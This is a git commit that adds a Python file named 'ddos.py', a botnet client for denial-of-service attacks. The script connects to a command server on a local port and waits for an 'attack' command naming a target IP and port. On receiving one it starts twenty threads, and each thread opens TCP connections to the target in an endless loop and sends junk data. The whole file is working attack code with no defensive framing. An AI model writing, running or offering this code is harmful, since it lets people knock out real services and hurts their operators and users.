6743239b0c3a712385fad6b811226269e9e25930
ANGKTOR <168734202+ANGKTOR@users.noreply.github.com>
2025-06-11 18:25:52 +0300

    ddos.py

---
+++ ddos.py
@@ -0,0 +1,22 @@
+# bot_client.py
+import socket, threading
+
+def attack(ip, port):
+    while True:
+        try:
+            s = socket.socket()
+            s.connect((ip, port))
+            s.send(b"A" * 1024)
+            s.close()
+        except:
+            pass
+
+client = socket.socket()
+client.connect(("127.0.0.1", 9999))
+
+while True:
+    cmd = client.recv(1024).decode()
+    if cmd.startswith("attack"):
+        _, ip, port = cmd.split()
+        for _ in range(20):
+            threading.Thread(target=attack, args=(ip, int(port))).start()
